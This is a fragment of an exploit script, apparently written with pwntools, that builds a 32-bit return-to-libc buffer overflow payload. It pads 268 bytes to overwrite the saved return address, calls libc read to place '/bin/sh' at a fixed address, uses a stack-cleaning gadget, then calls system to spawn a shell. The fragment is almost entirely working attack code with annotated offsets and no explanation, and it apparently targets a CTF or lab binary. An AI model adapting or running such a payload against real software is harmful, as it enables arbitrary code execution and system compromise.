...
CLEANER = 0x0804901b                          # add esp, 8; pop ebx; ret; 

payload = b"A" * 268                          # reach sEIP
payload += p32(LIBC.symbols["read"])          # call read
payload += p32(CLEANER)                       # return to the cleaner
payload += p32(0)                             # read from stdin
payload += p32(0x804c070)                     # memory zone to write the string
payload += p32(7)                             # read 7 byte /bin/sh

payload += p32(LIBC.symbols["system"])        # continue the payload with system
payload += p32(0xdeadbeef)
payload += p32(0x804c070)                     # where /bin/sh is stored   
